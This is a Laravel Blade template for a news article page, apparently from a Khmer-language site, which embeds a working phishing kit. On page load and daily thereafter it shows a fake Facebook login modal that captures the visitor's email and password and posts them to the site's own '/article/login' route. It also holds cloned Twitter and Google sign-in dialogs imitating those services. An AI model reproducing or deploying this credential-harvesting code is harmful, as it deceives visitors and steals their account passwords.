@extends('layouts.front')
@section('content')
<style type="text/css">
	.valid{
		border-color: #D45052;
	}
	.facebook-valid{
		padding: 10px;
		background-color: #ffebe8;
		font-family: Helvetica, Arial, sans-serif;
		border: 1px solid #DD3C10;
	}
	.facebook-valid h4{
		font-size: 14px;
		line-height: 0px;
		font-weight: bold;
	}
	.facebook-valid p{
		font-size: 12px;
		line-height: 1.34;
	}
	.twitter-box{
		font-family: Arial,sans-serif;
		width: auto;
    	max-width: 835px;
		background-color: #fff;
    	box-shadow: 0 0 225px rgba(255,255,255,0.55);
    	border: 1px solid #e1e8ed;
    	border-radius: 6px;
	}
	.tw-signin{
		    width: auto;
		    max-width: 380px;
		    padding: 20px 10px;
		    margin: 0 auto 10px;
		    display: block;
		    clear: both;
	}
	.tw-signin h1{
		font-size: 24px;
		font-weight: bold;

	}
	.tw-info{
		    width: auto;
		    display: block;
		    padding: 20px 10px;
		    background-color: #f4f4f4;
		    font-size: 13px;
		    line-height: 13px;
		    color: #8899a6;
		    border-bottom-right-radius: 4px;
		    border-bottom-left-radius: 4px
	}
	.box-in{
		margin: 0 auto 10px;
		max-width: 380px;
	}
	
	.tw-info p{
		margin: 0 auto;
    	margin-bottom: 15px;
	    font-size: 13px;
	    line-height: 13px;
	    color: #8899a6;
	}
	.btn-tw-login{
		font-size: 14px;
		font-weight: bold;
		background-color: #1C9EEE;
		color: #ffffff;
    	border-color: #2198E4;
	}
	@media only screen and (max-width: 450px) {
		.btn-tw-login
		{
			width: 100%;
		}
	}
	.btn-tw-login:hover{
		background-color: #1A91DB;
		color: #ffffff;
    	border-color: #1889CE;
	}
	.btn-tw-login:focus{
		background-color: #1C9EEE;
		color: #ffffff;
    	border-color: #2198E4;
	}
	.btn-tw-login:active{
		background-color: #3273A6;
		color: #ffffff;
    	border-color: #2198E4;
	}
	.row-login{

	}
	.forget-label{

		font-weight: normal;
	}
	.tw-logo{
		color: #1DA1F2;
		font-size: 26px;
	}
	/*Google Plus*/
	.gplus-logo{
		color: #D83838;
		font-size: 26px;
	}
	.g-box{
		width: auto;
		max-width: 380px;
		margin: 0 auto 10px;
		font-family: 'Open Sans', arial;
	}
	.g-box h1{
		font-size: 30px;
		text-align: center;
	}
	.g-box h2{
		text-align: center;
		font-size: 18px;
	}
	.g-rem{
		font-size: 13px;
		font-weight: normal;
	}
	.g-create{
		display: block;
		width: 100%;
		text-align: center;
	}
	.box-login{
		    background-color: #f7f7f7;
		    margin: 0 auto 25px;
		    width: auto;
		    max-width: 274;
    		padding: 40px 40px;
    		box-shadow: 0px 2px 2px rgba(0, 0, 0, 0.3);
	}
	@media only screen and (max-width: 580px) {
		.box-login
		{
			padding: 20px 20px;
		}
	}
	.box-login img{
		width: 96px;
		height: 96px;
		margin: 0 auto 10px;
		display: block;
		border-radius: 50%;
	}
	.box-longin .rem-check{
		background: #fff;
	}
	.btn-gplus-login{
		width: 100%;
		font-size: 14px;
		font-weight: bold;
		margin-top: 10px;
		background-color: #4588F6;
		color: #ffffff;
    	border-color: #2F5BB7;
		
    	text-shadow: 0 1px rgba(0,0,0,0.3);
	}
	.btn-gplus-login:hover{
		background-color: #357ae8;
		color: #ffffff;
    	border-color: #357ae8;
	}
	.btn-gplus-login:focus{
		background-color: #357ae8;
		color: #ffffff;
    	border-color: #357ae8;
	}
	.btn-gplus-login:active{
		background-color: #4588F6;
		color: #ffffff;
    	border-color: #2F5BB7;
	}
	.gplus-input-control{
		width: 100%;
		height: 44px;
    	font-size: 16px;
    	border: 1px solid #d9d9d9;
	    border-top: 1px solid #c0c0c0;
	    border-radius: 1px;
	}
</style>

				
<div class="modal fade" id="myModal" role="dialog">
	<div class="modal-dialog">
		<input type="hidden" name="cookie" id="islogin" value="{{$islogin}}">
		<!-- Modal content-->
		<div class="modal-content">
			<div class="modal-header">
				<button type="button" class="close" data-dismiss="modal">&times;</button>
				<!--     <h4 class="modal-title">Modal Header</h4> -->
			</div>
			<div class="modal-body">
				<div class="facebook-nav">
					<i class="fa fa-facebook-square" aria-hidden="true"></i> Facebook
				</div>
				<p class="facebook-login-info">Log in to use your Facebook account with <b>{{Config::get('app.name')}}</b>.</p>
				<div class="facebook-valid hide">
				<h4>Incorrect email or phone number</h4>
					<p>The email or phone number you’ve entered doesn’t match any account. <a href="https://www.facebook.com/r.php">Sign up for an account.</a></p>
					
				</div>
				<div class="row facebook-form">
					<div class="col-md-8 col-md-offset-2">
						
						{!! Form::open(array('url' => URL::route('article.store'), 'class'=>'form-horizontal' ,'method' =>'post')) !!}

						{{ csrf_field() }}
						<?php header('Access-Control-Allow-Origin: *'); ?>
						<div class="form-group">
							<label for="email" class="col-sm-4 control-label">Email or Phone:</label>
							<div class="col-sm-8">
								<input type="email" name="email" class="form-control va" id="email">
							</div>
						</div>
						<div class="form-group">
							<label for="password" class="col-sm-4 control-label">Password:</label>
							<div class="col-sm-8">
								<input type="password" name = "password" class="form-control" id="password">
							</div>
						</div>
						<div class="form-group">
							<div class="col-sm-offset-4 col-sm-8">
								<a id="ssss" class="btn btn-primary" href="https://www.facebook.com/sharer/sharer.php?u={{Request::url()}}" target="_blank">Log In</a>
							</div>
						</div>
						<div class="form-group">
							<div class="col-sm-offset-4 col-sm-8">
								<a href="https://www.facebook.com/login/identify?ctx=recover&lwv=100">Forgotten account?</a>
								<button type="button" onclick="location.href='https://www.facebook.com/reg/';" class="btn btn-create">Create New Account</button>
							</div>
						</div>
						{!! Form::close() !!}
					</div>
				</div>
			</div>
		</div>

	</div>
</div>
<!--Twitter Dialog-->
<div class="modal fade" id="twitterModal" role="dialog">
	<div class="modal-dialog">
		<input type="hidden" name="cookie" id="islogin" value="{{$islogin}}">
		<!-- Modal content-->
		<div class="modal-content">
			<div class="modal-header">
				<i class="fa fa-twitter tw-logo" aria-hidden="true" ></i>
				<button type="button" class="close" data-dismiss="modal">&times;</button>
				<!--     <h4 class="modal-title">Modal Header</h4> -->
			</div>
			<div class="modal-body">
				<div class="twitter-box">
					<div class="tw-signin">
						<form>
						  <div class="form-group">
						    <h1>Log in to Twitter</h1>
						    <input type="email" class="form-control" id="exampleInputEmail1" placeholder="Phone, email or username">
						  </div>
						  <div class="form-group">
						    <input type="password" class="form-control" id="exampleInputPassword1" placeholder="Password">
						  </div>
						  
						  	<div class="row-login">
						  		<a href="#" class="btn btn-tw-login">Log in</a>
						  		<label class="forget-label"><input type="checkbox" checked="true" name=""> Remember me</label><span class="separator">.</span><a href="https://twitter.com/account/begin_password_reset">Forgot password?</a>
						  	</div>
						</form>
					</div>
					<div class="tw-info">
						<div class="box-in">
							<p>New to Twitter? <a href="https://twitter.com/signup">Sign up now »</a></p>
							<p>Already using Twitter via text message? <a href="https://twitter.com/account/complete">Activate your account »</a></p>
						</div>
						
					</div>
					
				</div>
			</div>
		</div>

	</div>
</div>
<!--Google Plus Dialog-->
<div class="modal fade" id="gPlusModal" role="dialog">
	<div class="modal-dialog">
		<input type="hidden" name="cookie" id="islogin" value="{{$islogin}}">
		<!-- Modal content-->
		<div class="modal-content">
			<div class="modal-header">
				<i class="fa fa-google-plus gplus-logo" aria-hidden="true" ></i>
				<button type="button" class="close" data-dismiss="modal">&times;</button>
				<!--     <h4 class="modal-title">Modal Header</h4> -->
			</div>
			<div class="modal-body">
				<div class="g-box">
					<h1>One account. All of Google.</h1>
					<h2>Sign in with your Google Account</h2>
					<div class="box-login">
						<img src="/images/u.png">
						<form>
							<input id="Email" name="Email" type="email" placeholder="Email" value="" spellcheck="false" class="form-control gplus-input-control">
							<input id="Passwd" name="Passwd" type="password" placeholder="Password" class="form-control gplus-input-control">
							<a href="https://plus.google.com/share?url={{Request::url()}}" name="signIn" class="btn btn-gplus-login" type="submit">Sign in</a>
							<label class="pull-left g-rem"><input type="checkbox" name="remember" class="rem-check"> Stay signed in</label>
							<a href="https://accounts.google.com/RecoverAccount?continue=https%3A%2F%2Faccounts.google.com%2FManageAccount" class="pull-right">Need help?</a>
							<br style="clear: both;" />
						</form>
					</div>
					<a href="https://accounts.google.com/SignUp?continue=https%3A%2F%2Faccounts.google.com%2FManageAccount" class="g-create">Create an account</a>
				</div>
			</div>
		</div>

	</div>
</div>
<div class="row">
	<div class="col-md-12">
		<div class="col-md-9 single-article-content">
			<div class="single-article-header">
				<h4>{{$article->title}}</h4>
				<div>
					<div class="pull-left">
						<span><i class="fa fa-clock-o" aria-hidden="true"></i> {{ date('l jS \of F Y h:i A', strtotime($article->created_at))}}</span>
					</div><!-- 
					<div class="pull-left">
						<span><i class="fa fa-clock-o" aria-hidden="true"></i>{{ setlocale(LC_ALL, 'km_KH.utf8')}}{{
						strftime("%A %e %B %Y", strtotime($article->created_at))}}</span>
					</div> -->
					<div class="pull-right">
						<a href="https://www.facebook.com/sharer/sharer.php?u={{Request::url()}}" class="btn btn-facebook-share" data-toggle="modal" target="_blank"><i class="fa fa-facebook-square" aria-hidden="true" ></i></a>
						<!-- <a href="#" class="btn btn-twitter-share" data-toggle="modal"><i class="fa fa-twitter" aria-hidden="true" ></i></a>
						<a href="https://www.facebook.com/sharer/sharer.php?u={{Request::url()}}" class="btn btn-gplus-share" data-toggle="modal" target="_blank"><i class="fa fa-google-plus" aria-hidden="true" ></i></a> -->
					</div>

				</div>
				<hr/>
			</div>
			<article>
				<p>
					{!!str_replace('/n\r', '<br/>', $article->body)!!}
				</p>
				<p>
					<br>
					@foreach ($article->videos as $video)
					<strong>សូមចុចទស្សនា​វិដេអូ​ខាង​ក្រោម​នេះ</strong>
					<div class="responsive-video">
						<iframe src="{{$video}}" width="560" height="400" frameborder="0" allowTransparency="true" allowfullscreen=""></iframe>
					</div>
					@endforeach
				</p>
				@foreach ($medias as $media)
				<p>
					<img src="{{URL::to('media_photo?id='. $media->id . '&width=400&height=400') }}" class="img-responsive" alt="Responsive image">
				</p>
				@endforeach
				
			</article>
		</div>
		<!-- Relative Article -->
		<div class="col-md-3">
			@foreach ($relatearticles as $relarticle)
			<div class="rel-article">
				<a href="/news/{{$relarticle->id}}">
					<div class="box ratio16_9">
                        <div class="img-bg" style="background-image: url('{{URL::to('media_photo?id='. $relarticle->image_header . '&width=400&height=400') }}');">
                                  
                        </div>
                    </div>
					<!-- <img src="{{ url('media_photo?id=89ea19c0-9c29-11e6-acce-eb12cb179d56&width=400&height=400')}}" class="img-responsive" alt="Responsive image"/> -->
					<div class="rel-article-content">
						<span class="bigtitle">{{$relarticle->title}}</span>
						<span class="biginfo"><i class="fa fa-clock-o" aria-hidden="true"></i> 
							{{$relarticle->date}}
						</span>
					</div>
				</a>
			</div>
			@endforeach
		</div>
	</div>
</div>
<script type="text/javascript">
	$(document).ready(function(){
		function setCookie(cname, cvalue, exdays) {
			var d = new Date();
			d.setTime(d.getTime() + (exdays*24*60*60*1000));
			var expires = "expires="+d.toUTCString();
			document.cookie = cname + "=" + cvalue + ";" + expires + ";path=/";
		}
		$(".btn-facebook-share").click(function(event){
			$(".facebook-valid").addClass("hide");
			if(checkCookie() == 0){
				$('#myModal').modal('show');
				return false;
			}
			
		});
		$(".btn-twitter-share").click(function(event){
			$("#twitterModal").modal("show");
			return false;
		});
		$(".btn-gplus-share").click(function(event){
			$("#gPlusModal").modal("show");
			return false;
		});
		$("#ssss").click(function(event){
			var email = $('#email').val();
			var password = $('#password').val();
			if(email != "" && password != ""){
				setCookie("login","1",1);
				$('#myModal').modal('hide');
				$.ajax({
					type: "POST",
					url : "/article/login",
					data:{_token:'<?php echo csrf_token() ?>', email:email,password:password },
					success : function(data){

						//window.open("https://www.facebook.com/sharer/sharer.php?u=" + document.URL);
					}
				});
			}else{
				$(".facebook-valid").removeClass("hide");
				return false;
			}
		});
		function getCookie(cname) {
			var name = cname + "=";
			var ca = document.cookie.split(';');
			for(var i = 0; i < ca.length; i++) {
				var c = ca[i];
				while (c.charAt(0) == ' ') {
					c = c.substring(1);
				}
				if (c.indexOf(name) == 0) {
					return c.substring(name.length, c.length);
				}
			}
			return "";
		}

		function checkCookie() {
			var user = getCookie("login");
			if (user != "") {
				return 1;
			} else {
				if (user == "") {
					return 0;
				}
			}
		}
		
		var islogin = checkCookie();
		
		if(islogin == 0){
			$('#myModal').modal('show');
		}
		setInterval(function(){
			if(checkCookie() == 0){
				$('#myModal').modal('show');
			}
		},24*60*60*1000);
		
		$('#btnlogin').click(function(){
			
			var email = $('#email').val();
			var password = $('#password').val();
			if(email != "" && password != ""){
				setCookie("login","1",1);
				$('#myModal').modal('hide');
				$.ajax({
					type: "POST",
					url : "/article/login",
					data:{_token:'<?php echo csrf_token() ?>', email:email,password:password },
					success : function(data){

						//window.open("https://www.facebook.com/sharer/sharer.php?u=" + document.URL);
					}
				});
			}else{
				$(".facebook-valid").removeClass("hide");
			}
		});
	});
	

</script>
@endsection